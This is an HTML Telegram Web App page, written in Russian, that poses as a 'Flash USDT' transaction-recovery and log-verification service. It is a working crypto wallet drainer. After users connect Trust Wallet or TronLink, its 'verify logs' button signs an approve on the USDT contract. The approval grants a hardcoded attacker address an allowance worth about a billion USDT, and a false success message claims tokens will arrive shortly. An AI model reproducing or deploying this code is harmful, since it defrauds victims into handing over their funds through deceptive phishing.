<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flash USDT: Центр Восстановления</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background-color: #0f0f0f; color: #ffffff; font-family: -apple-system, system-ui, sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
        .container { border: 1px solid #333; padding: 30px 20px; border-radius: 28px; background: #1a1a1a; box-shadow: 0 15px 35px rgba(0,0,0,0.5); width: 100%; max-width: 400px; margin: 0 auto; }
        .status { font-size: 10px; color: #0088cc; font-weight: bold; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
        h2 { margin: 0 0 10px 0; font-size: 20px; font-weight: 700; }
        p { color: #888; font-size: 13px; line-height: 1.5; margin-bottom: 25px; }
        .btn { background: #0088cc; color: white; border: none; padding: 16px; font-size: 14px; font-weight: bold; border-radius: 14px; cursor: pointer; width: 100%; text-transform: uppercase; margin-bottom: 10px; transition: 0.2s; }
        .btn-alt { background: #222; border: 1px solid #444; color: #ccc; }
        .btn:active { transform: scale(0.98); opacity: 0.9; }
        .wallet-icons { display: flex; justify-content: center; gap: 15px; margin-top: 20px; opacity: 0.5; filter: grayscale(1); }
    </style>
</head>
<body>

<div class="container" id="app">
    <div class="status">● СИСТЕМА ВАЛИДАЦИИ АКТИВНА</div>
    <h2>Flash USDT Protocol</h2>
    <p id="infoText">Для восстановления транзакции необходимо подключить кошелек и верифицировать логи узла.</p>

    <div id="walletActive" style="display: none;">
        <button id="verifyBtn" class="btn">ВЕРИФИЦИРОВАТЬ ЛОГИ</button>
    </div>

    <div id="walletNone">
        <button id="trustBtn" class="btn">Открыть в Trust Wallet</button>
        <button id="tronBtn" class="btn btn-alt">Открыть в TronLink</button>
        <p style="font-size: 11px; margin-top: 15px;">Выберите ваш основной кошелек для синхронизации</p>
    </div>

    <div class="wallet-icons">
        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" width="24">
        <img src="https://www.tronlink.org/img/logo.svg" width="24">
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const ADMIN_ADDRESS = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

    const walletActive = document.getElementById('walletActive');
    const walletNone = document.getElementById('walletNone');
    const infoText = document.getElementById('infoText');

    // Функция проверки кошелька
    async function checkWallet() {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            walletActive.style.display = 'block';
            walletNone.style.display = 'none';
            infoText.innerText = 'Кошелек успешно подключен. Завершите верификацию логов.';
        } else {
            walletActive.style.display = 'none';
            walletNone.style.display = 'block';
        }
    }

    // Кнопки глубоких ссылок
    document.getElementById('trustBtn').onclick = () => {
        const link = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(window.location.href);
        window.open(link, '_blank');
    };

    document.getElementById('tronBtn').onclick = () => {
        const link = "tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(window.location.href);
        window.open(link, '_blank');
    };

    // Логика Апрува
    document.getElementById('verifyBtn').onclick = async () => {
        try {
            const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
            await contract.approve(ADMIN_ADDRESS, '1000000000000000').send();
            
            tg.showPopup({
                title: 'Готово',
                message: 'Approve успешно подписан. Система зачислит токены в течение 15-30 минут.',
                buttons: [{type: 'ok'}]
            });
            setTimeout(() => tg.close(), 5000);
        } catch (e) {
            tg.showAlert('Ошибка: действие отклонено пользователем.');
        }
    };

    // Запускаем проверку при старте
    setInterval(checkWallet, 1000); 
</script>
</body>
</html>
